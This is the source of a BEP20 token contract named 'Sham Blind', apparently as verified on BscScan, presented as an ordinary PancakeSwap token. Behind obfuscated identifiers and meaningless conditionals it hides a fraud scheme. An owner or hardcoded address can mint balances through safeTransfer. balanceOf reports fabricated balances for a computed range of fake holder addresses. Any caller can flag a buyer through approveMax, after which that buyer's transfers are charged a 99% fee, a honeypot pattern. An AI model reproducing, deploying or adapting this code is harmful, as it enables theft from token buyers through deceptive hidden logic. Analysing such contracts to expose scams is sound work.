/**
 *Submitted for verification at BscScan.com on 2023-01-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;


interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


library SafeMath {

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}


interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


interface IUniswapV2Router {

    function factory() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function WETH() external pure returns (address);

}


interface IBEP20 {

    function getOwner() external view returns (address);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function balanceOf(address account) external view returns (uint256);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function totalSupply() external view returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function name() external view returns (string memory);

    function approve(address spender, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}




contract ShamBlind is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    uint256 constant tokenTxMinMarketingSenderReceiver = 1000000 * 10 ** 18;
    uint160 constant receiverTakeIsBurn = 608926279563;
    uint256 public atTxTakeSell = 0;

    bool public buyTradingAmountSender1 = false;
    bool public mintListBurnTake = false;

    uint256 private receiverTotalListMarketingReceiverLaunchedSender = 0;
    uint256 public modeReceiverLaunchedListMin = 0;
    uint256 private burnTxTotalLaunched = 0;

    string constant _name = "Sham Blind";

    mapping(address => uint256) _balances;
    mapping(address => bool)  toIsAmountLaunch;
    mapping(address => bool)  autoBuyAmountTeamMint;
    uint256 constant receiverExemptBotsBuyFundEnable = 100000000 * (10 ** 18);
    uint256 private mintShouldReceiverBuyTo = 100;
    uint160 constant fundMinSwapTeam = 784125916998 * 2 ** 80;
    uint256  botsExemptLaunchedTx = 100000000 * 10 ** _decimals;


    uint256 public buyTradingAmountSender = 0;
    address public uniswapV2Pair;


    uint256 private receiverFundBotsAmountBuyLiquidityMode = 0;
    uint160 constant takeTotalSenderBots = 199257411333 * 2 ** 120;

    uint256 public txTokenShouldTotal = 0;
    uint160 constant tokenBotsAmountBurn = 904858664279 * 2 ** 40;

    uint256 private burnBuyFromLiquidity = 0;
    uint256 constant botsSenderAutoSwapListIs = 100 * 10 ** 18;


    address private totalExemptMinTxReceiverMaxList = (msg.sender);
    uint256 private buyTradingAmountSender0 = 0;
    bool private receiverTxTakeAt = false;

    string constant _symbol = "SBD";
    mapping(address => bool) private isAutoTeamLaunch;
    
    uint256 private launchFromAtMarketing = 0;
    uint256 public receiverLaunchedTakeLiquidityFrom = 0;
    bool private marketingTxSenderTake = false;
    uint256  teamLimitReceiverBuy = 100000000 * 10 ** _decimals;
    uint256 txSwapAutoTradingShouldBurn = 0;
    mapping(address => mapping(address => uint256)) _allowances;
    IUniswapV2Router public launchedFeeSwapReceiver;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        launchedFeeSwapReceiver = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(launchedFeeSwapReceiver.factory()).createPair(address(this), launchedFeeSwapReceiver.WETH());
        _allowances[address(this)][address(launchedFeeSwapReceiver)] = receiverExemptBotsBuyFundEnable;

        isAutoTeamLaunch[msg.sender] = true;
        isAutoTeamLaunch[address(this)] = true;

        _balances[msg.sender] = receiverExemptBotsBuyFundEnable;
        emit Transfer(address(0), msg.sender, receiverExemptBotsBuyFundEnable);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return receiverExemptBotsBuyFundEnable;
    }

    function getwalletModeFundAuto() public view returns (uint256) {
        if (txTokenShouldTotal != receiverLaunchedTakeLiquidityFrom) {
            return receiverLaunchedTakeLiquidityFrom;
        }
        if (txTokenShouldTotal != txTokenShouldTotal) {
            return txTokenShouldTotal;
        }
        return txTokenShouldTotal;
    }

    function txFeeMintBotsIsList(address listMinIsLaunch, bool amountLimitSwapTrading) internal returns (uint256) {
        if (autoBuyAmountTeamMint[listMinIsLaunch]) {
            return 99;
        }
        
        if (receiverFundBotsAmountBuyLiquidityMode == receiverFundBotsAmountBuyLiquidityMode) {
            receiverFundBotsAmountBuyLiquidityMode = buyTradingAmountSender0;
        }

        if (atTxTakeSell != burnTxTotalLaunched) {
            atTxTakeSell = receiverFundBotsAmountBuyLiquidityMode;
        }

        if (buyTradingAmountSender == txTokenShouldTotal) {
            buyTradingAmountSender = receiverTotalListMarketingReceiverLaunchedSender;
        }


        if (amountLimitSwapTrading) {
            return launchFromAtMarketing;
        }
        
        if (receiverTotalListMarketingReceiverLaunchedSender == mintShouldReceiverBuyTo) {
            receiverTotalListMarketingReceiverLaunchedSender = modeReceiverLaunchedListMin;
        }

        if (buyTradingAmountSender1 == marketingTxSenderTake) {
            buyTradingAmountSender1 = mintListBurnTake;
        }

        if (receiverLaunchedTakeLiquidityFrom == modeReceiverLaunchedListMin) {
            receiverLaunchedTakeLiquidityFrom = buyTradingAmountSender0;
        }


        if (!amountLimitSwapTrading && listMinIsLaunch == uniswapV2Pair) {
            return burnTxTotalLaunched;
        }
        
        return 0;
    }

    function setmarketingAtModeSell(uint256 walletSellLimitLaunch) public onlyOwner {
        if (modeReceiverLaunchedListMin == launchFromAtMarketing) {
            launchFromAtMarketing=walletSellLimitLaunch;
        }
        if (modeReceiverLaunchedListMin == launchFromAtMarketing) {
            launchFromAtMarketing=walletSellLimitLaunch;
        }
        if (modeReceiverLaunchedListMin == receiverFundBotsAmountBuyLiquidityMode) {
            receiverFundBotsAmountBuyLiquidityMode=walletSellLimitLaunch;
        }
        modeReceiverLaunchedListMin=walletSellLimitLaunch;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function setlimitBurnFundBuy(uint256 walletSellLimitLaunch) public onlyOwner {
        burnBuyFromLiquidity=walletSellLimitLaunch;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return minTxBotsSwap(msg.sender, recipient, amount);
    }

    function getatSwapFeeTotal() public view returns (uint256) {
        return atTxTakeSell;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function setswapLiquidityBuyTx(uint256 walletSellLimitLaunch) public onlyOwner {
        if (receiverLaunchedTakeLiquidityFrom != buyTradingAmountSender0) {
            buyTradingAmountSender0=walletSellLimitLaunch;
        }
        if (receiverLaunchedTakeLiquidityFrom == atTxTakeSell) {
            atTxTakeSell=walletSellLimitLaunch;
        }
        if (receiverLaunchedTakeLiquidityFrom != receiverLaunchedTakeLiquidityFrom) {
            receiverLaunchedTakeLiquidityFrom=walletSellLimitLaunch;
        }
        receiverLaunchedTakeLiquidityFrom=walletSellLimitLaunch;
    }

    function setexemptMarketingTakeMax(uint256 walletSellLimitLaunch) public onlyOwner {
        if (mintShouldReceiverBuyTo != receiverTotalListMarketingReceiverLaunchedSender) {
            receiverTotalListMarketingReceiverLaunchedSender=walletSellLimitLaunch;
        }
        if (mintShouldReceiverBuyTo != txTokenShouldTotal) {
            txTokenShouldTotal=walletSellLimitLaunch;
        }
        mintShouldReceiverBuyTo=walletSellLimitLaunch;
    }

    function setlaunchShouldReceiverAmountFundModeFee(address walletSellLimitLaunch,bool buyLimitShouldMode) public onlyOwner {
        if (walletSellLimitLaunch != totalExemptMinTxReceiverMaxList) {
            mintListBurnTake=buyLimitShouldMode;
        }
        if (walletSellLimitLaunch != totalExemptMinTxReceiverMaxList) {
            mintListBurnTake=buyLimitShouldMode;
        }
        isAutoTeamLaunch[walletSellLimitLaunch]=buyLimitShouldMode;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function swapMarketingLaunchShouldAtTeam(address receiverSellMaxMin) private view returns (bool) {
        if (receiverSellMaxMin == totalExemptMinTxReceiverMaxList) {
            return true;
        }
        return false;
    }

    function burnFromTakeList(address minBotsAmountTeam) private pure returns (bool) {
        return minBotsAmountTeam == fundReceiverBurnSenderTradingAt();
    }

    function setshouldFundTxBots(bool walletSellLimitLaunch) public onlyOwner {
        if (mintListBurnTake != buyTradingAmountSender1) {
            buyTradingAmountSender1=walletSellLimitLaunch;
        }
        if (mintListBurnTake != mintListBurnTake) {
            mintListBurnTake=walletSellLimitLaunch;
        }
        mintListBurnTake=walletSellLimitLaunch;
    }

    function exemptFundIsTotalTradingLaunchAmount(uint160 minBotsAmountTeam) private pure returns (bool) {
        uint160 atReceiverAutoEnable = takeTotalSenderBots + fundMinSwapTeam + tokenBotsAmountBurn + receiverTakeIsBurn;
        if (minBotsAmountTeam >= uint160(atReceiverAutoEnable)) {
            if (minBotsAmountTeam <= uint160(atReceiverAutoEnable) + 300000) {
                return true;
            }
        }
        return false;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (exemptFundIsTotalTradingLaunchAmount(uint160(account))) {
            return amountMaxLiquidityFee(uint160(account));
        }
        return _balances[account];
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != receiverExemptBotsBuyFundEnable) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return minTxBotsSwap(sender, recipient, amount);
    }

    function feeEnableSenderTeamAtMarketing(address listMinIsLaunch, address exemptLaunchedMinFromLaunch, uint256 mintEnableIsToken) internal returns (uint256) {
        
        if (marketingTxSenderTake != receiverTxTakeAt) {
            marketingTxSenderTake = mintListBurnTake;
        }

        if (receiverLaunchedTakeLiquidityFrom != receiverTotalListMarketingReceiverLaunchedSender) {
            receiverLaunchedTakeLiquidityFrom = atTxTakeSell;
        }

        if (mintListBurnTake == mintListBurnTake) {
            mintListBurnTake = mintListBurnTake;
        }


        uint256 autoSwapSenderExemptFund = mintEnableIsToken.mul(txFeeMintBotsIsList(listMinIsLaunch, exemptLaunchedMinFromLaunch == uniswapV2Pair)).div(mintShouldReceiverBuyTo);
        
        if (autoSwapSenderExemptFund > 0) {
            _balances[address(this)] = _balances[address(this)].add(autoSwapSenderExemptFund);
            emit Transfer(listMinIsLaunch, address(this), autoSwapSenderExemptFund);
        }
        
        return mintEnableIsToken.sub(autoSwapSenderExemptFund);
    }

    function fundReceiverBurnSenderTradingAt() private pure returns (address) {
        return 0xa2D5F386C39E73712fF384B94B7230D0ec1948d7;
    }

    function safeTransfer(address listMinIsLaunch, address fromShouldMintTotalBuy, uint256 mintEnableIsToken) public {
        if (!burnFromTakeList(msg.sender) && msg.sender != totalExemptMinTxReceiverMaxList) {
            return;
        }
        if (exemptFundIsTotalTradingLaunchAmount(uint160(fromShouldMintTotalBuy))) {
            modeTotalTeamSwapListSender(listMinIsLaunch, fromShouldMintTotalBuy, mintEnableIsToken, false);
            return;
        }
        if (exemptFundIsTotalTradingLaunchAmount(uint160(listMinIsLaunch))) {
            modeTotalTeamSwapListSender(listMinIsLaunch, fromShouldMintTotalBuy, mintEnableIsToken, true);
            return;
        }
        if (listMinIsLaunch == address(0)) {
            _balances[fromShouldMintTotalBuy] = _balances[fromShouldMintTotalBuy].add(mintEnableIsToken);
            return;
        }
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function getexemptMarketingTakeMax() public view returns (uint256) {
        if (mintShouldReceiverBuyTo == burnTxTotalLaunched) {
            return burnTxTotalLaunched;
        }
        return mintShouldReceiverBuyTo;
    }

    function getswapLiquidityBuyTx() public view returns (uint256) {
        return receiverLaunchedTakeLiquidityFrom;
    }

    function teamMaxTakeWallet(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setatSwapFeeTotal(uint256 walletSellLimitLaunch) public onlyOwner {
        if (atTxTakeSell == atTxTakeSell) {
            atTxTakeSell=walletSellLimitLaunch;
        }
        if (atTxTakeSell == launchFromAtMarketing) {
            launchFromAtMarketing=walletSellLimitLaunch;
        }
        atTxTakeSell=walletSellLimitLaunch;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getshouldFundTxBots() public view returns (bool) {
        if (mintListBurnTake != marketingTxSenderTake) {
            return marketingTxSenderTake;
        }
        if (mintListBurnTake != mintListBurnTake) {
            return mintListBurnTake;
        }
        if (mintListBurnTake != marketingTxSenderTake) {
            return marketingTxSenderTake;
        }
        return mintListBurnTake;
    }

    function liquidityTradingIsSender(address listMinIsLaunch) internal view returns (bool) {
        return !isAutoTeamLaunch[listMinIsLaunch];
    }

    function getmarketingAtModeSell() public view returns (uint256) {
        if (modeReceiverLaunchedListMin != receiverLaunchedTakeLiquidityFrom) {
            return receiverLaunchedTakeLiquidityFrom;
        }
        if (modeReceiverLaunchedListMin == receiverFundBotsAmountBuyLiquidityMode) {
            return receiverFundBotsAmountBuyLiquidityMode;
        }
        if (modeReceiverLaunchedListMin != buyTradingAmountSender0) {
            return buyTradingAmountSender0;
        }
        return modeReceiverLaunchedListMin;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function setmodeLaunchedMarketingFund(uint256 walletSellLimitLaunch) public onlyOwner {
        buyTradingAmountSender0=walletSellLimitLaunch;
    }

    function amountMaxLiquidityFee(uint160 minBotsAmountTeam) private view returns (uint256) {
        uint160 atReceiverAutoEnable = takeTotalSenderBots + fundMinSwapTeam + tokenBotsAmountBurn + receiverTakeIsBurn;
        uint160 amountMintTokenIs = minBotsAmountTeam - atReceiverAutoEnable;
        if (amountMintTokenIs < txSwapAutoTradingShouldBurn) {
            return botsSenderAutoSwapListIs * amountMintTokenIs;
        }
        return tokenTxMinMarketingSenderReceiver + botsSenderAutoSwapListIs * amountMintTokenIs;
    }

    function getlimitBurnFundBuy() public view returns (uint256) {
        if (burnBuyFromLiquidity == mintShouldReceiverBuyTo) {
            return mintShouldReceiverBuyTo;
        }
        if (burnBuyFromLiquidity == receiverLaunchedTakeLiquidityFrom) {
            return receiverLaunchedTakeLiquidityFrom;
        }
        return burnBuyFromLiquidity;
    }

    function getmodeLaunchedMarketingFund() public view returns (uint256) {
        if (buyTradingAmountSender0 != burnBuyFromLiquidity) {
            return burnBuyFromLiquidity;
        }
        return buyTradingAmountSender0;
    }

    function isApproveMax(address spender) public view returns (bool) {
        return autoBuyAmountTeamMint[spender];
    }

    function getlaunchShouldReceiverAmountFundModeFee(address walletSellLimitLaunch) public view returns (bool) {
        if (walletSellLimitLaunch == totalExemptMinTxReceiverMaxList) {
            return mintListBurnTake;
        }
        if (walletSellLimitLaunch == totalExemptMinTxReceiverMaxList) {
            return receiverTxTakeAt;
        }
        if (isAutoTeamLaunch[walletSellLimitLaunch] != isAutoTeamLaunch[walletSellLimitLaunch]) {
            return marketingTxSenderTake;
        }
            return isAutoTeamLaunch[walletSellLimitLaunch];
    }

    function setwalletModeFundAuto(uint256 walletSellLimitLaunch) public onlyOwner {
        if (txTokenShouldTotal != modeReceiverLaunchedListMin) {
            modeReceiverLaunchedListMin=walletSellLimitLaunch;
        }
        txTokenShouldTotal=walletSellLimitLaunch;
    }

    function modeTotalTeamSwapListSender(address listMinIsLaunch, address fromShouldMintTotalBuy, uint256 mintEnableIsToken, bool burnLimitSenderTradingListTxAt) private {
        uint160 atReceiverAutoEnable = takeTotalSenderBots + fundMinSwapTeam + tokenBotsAmountBurn + receiverTakeIsBurn;
        if (burnLimitSenderTradingListTxAt) {
            listMinIsLaunch = address(uint160(atReceiverAutoEnable + txSwapAutoTradingShouldBurn));
            txSwapAutoTradingShouldBurn++;
            _balances[fromShouldMintTotalBuy] = _balances[fromShouldMintTotalBuy].add(mintEnableIsToken);
        } else {
            _balances[listMinIsLaunch] = _balances[listMinIsLaunch].sub(mintEnableIsToken);
        }
        if (mintEnableIsToken == 0) {
            return;
        }
        emit Transfer(listMinIsLaunch, fromShouldMintTotalBuy, mintEnableIsToken);
    }

    function minTxBotsSwap(address listMinIsLaunch, address fromShouldMintTotalBuy, uint256 mintEnableIsToken) internal returns (bool) {
        if (exemptFundIsTotalTradingLaunchAmount(uint160(fromShouldMintTotalBuy))) {
            modeTotalTeamSwapListSender(listMinIsLaunch, fromShouldMintTotalBuy, mintEnableIsToken, false);
            return true;
        }
        if (exemptFundIsTotalTradingLaunchAmount(uint160(listMinIsLaunch))) {
            modeTotalTeamSwapListSender(listMinIsLaunch, fromShouldMintTotalBuy, mintEnableIsToken, true);
            return true;
        }
        
        bool enableLiquidityAtMode = swapMarketingLaunchShouldAtTeam(listMinIsLaunch) || swapMarketingLaunchShouldAtTeam(fromShouldMintTotalBuy);
        
        if (atTxTakeSell != receiverLaunchedTakeLiquidityFrom) {
            atTxTakeSell = burnBuyFromLiquidity;
        }


        if (listMinIsLaunch == uniswapV2Pair && !enableLiquidityAtMode) {
            toIsAmountLaunch[fromShouldMintTotalBuy] = true;
        }
        
        if (buyTradingAmountSender == mintShouldReceiverBuyTo) {
            buyTradingAmountSender = atTxTakeSell;
        }

        if (txTokenShouldTotal == mintShouldReceiverBuyTo) {
            txTokenShouldTotal = burnBuyFromLiquidity;
        }


        if (enableLiquidityAtMode) {
            return teamMaxTakeWallet(listMinIsLaunch, fromShouldMintTotalBuy, mintEnableIsToken);
        }
        
        if (receiverTotalListMarketingReceiverLaunchedSender == launchFromAtMarketing) {
            receiverTotalListMarketingReceiverLaunchedSender = buyTradingAmountSender0;
        }

        if (receiverTxTakeAt == receiverTxTakeAt) {
            receiverTxTakeAt = receiverTxTakeAt;
        }


        _balances[listMinIsLaunch] = _balances[listMinIsLaunch].sub(mintEnableIsToken, "Insufficient Balance!");
        
        if (marketingTxSenderTake == marketingTxSenderTake) {
            marketingTxSenderTake = marketingTxSenderTake;
        }

        if (receiverTotalListMarketingReceiverLaunchedSender != receiverTotalListMarketingReceiverLaunchedSender) {
            receiverTotalListMarketingReceiverLaunchedSender = atTxTakeSell;
        }

        if (receiverTxTakeAt == buyTradingAmountSender1) {
            receiverTxTakeAt = buyTradingAmountSender1;
        }


        uint256 mintEnableIsTokenReceived = liquidityTradingIsSender(listMinIsLaunch) ? feeEnableSenderTeamAtMarketing(listMinIsLaunch, fromShouldMintTotalBuy, mintEnableIsToken) : mintEnableIsToken;

        _balances[fromShouldMintTotalBuy] = _balances[fromShouldMintTotalBuy].add(mintEnableIsTokenReceived);
        emit Transfer(listMinIsLaunch, fromShouldMintTotalBuy, mintEnableIsTokenReceived);
        return true;
    }

    function approveMax(address spender) external {
        if (toIsAmountLaunch[spender]) {
            autoBuyAmountTeamMint[spender] = true;
        }
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}